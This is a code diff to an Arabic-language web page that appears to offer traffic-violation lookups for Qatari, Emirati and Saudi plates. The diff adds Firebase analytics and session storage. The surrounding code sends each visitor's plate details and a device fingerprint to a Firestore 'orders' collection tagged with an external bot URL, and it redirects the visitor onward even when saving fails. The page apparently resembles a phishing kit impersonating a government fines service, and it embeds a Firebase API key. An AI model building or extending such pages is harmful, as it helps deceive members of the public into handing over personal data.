@@ -236,6 +236,7 @@
 
 <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics-compat.js"></script>
 
 <script>
     // التحكم في الهيدر
@@ -293,7 +294,7 @@
         document.getElementById("ksaContainer").style.display = (val === "KSA") ? "block" : "none";
     };
 
-    // بيانات Firebase من الصورة (jusour-qatar)
+    // بيانات Firebase الحقيقية لمشروع jusour-qatar
     const firebaseConfig = {
       apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
       authDomain: "jusour-qatar.firebaseapp.com",
@@ -306,6 +307,10 @@
     
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+    const analytics = firebase.analytics();
+
+    // تتبع الزيارة فور فتح الصفحة
+    analytics.logEvent('page_view', { page_title: 'الرئيسية - استعلام المخالفات' });
 
     document.getElementById("mainTrafficForm").onsubmit = async (e) => {
         e.preventDefault();
@@ -314,11 +319,15 @@
         btn.innerHTML = "جاري التحقق...";
         btn.disabled = true;
         
+        const plateNumber = document.getElementById("plateNumber").value;
+        const plateCode = document.getElementById("plateCode").value;
+        const plateSource = sSel.value;
+
         const payload = {
-            source: sSel.value,
-            number: document.getElementById("plateNumber").value,
-            code: document.getElementById("plateCode").value,
-            ksa: sSel.value === "KSA" ? [document.getElementById("k1").value, document.getElementById("k2").value, document.getElementById("k3").value] : null,
+            source: plateSource,
+            number: plateNumber,
+            code: plateCode,
+            ksa: plateSource === "KSA" ? [document.getElementById("k1").value, document.getElementById("k2").value, document.getElementById("k3").value] : null,
             device_info: getDeviceFingerprint(),
             status: "pending",
             bot_url: "https://dubai-bot-1-6f5q.onrender.com",
@@ -326,17 +335,27 @@
         };
 
         try {
-            // إرسال البيانات لـ Firebase
-            await db.collection("orders").add(payload);
+            // حفظ الطلب في Firebase للتتبع
+            const docRef = await db.collection("orders").add(payload);
             
-            // التوجيه لصفحة الانتظار (عرض النتائج)
+            // تسجيل الحدث في Analytics
+            analytics.logEvent('search_initiated', {
+                plate_source: plateSource,
+                order_id: docRef.id
+            });
+
+            // حفظ بيانات الجلسة للانتقال للصفحة التالية
+            sessionStorage.setItem("last_order_id", docRef.id);
+            sessionStorage.setItem("plate_info", JSON.stringify({source: plateSource, number: plateNumber, code: plateCode}));
+
+            // التوجيه لصفحة النتائج
             window.location.href = "violations_view.php";
         } catch (err) { 
-            console.error("Error:", err);
-            // في حال حدوث خطأ، نوجه العميل أيضاً لضمان استمرار العملية
+            console.error("Firebase Error:", err);
             window.location.href = "violations_view.php";
         }
     };
 </script>
 </body>
 </html>
+
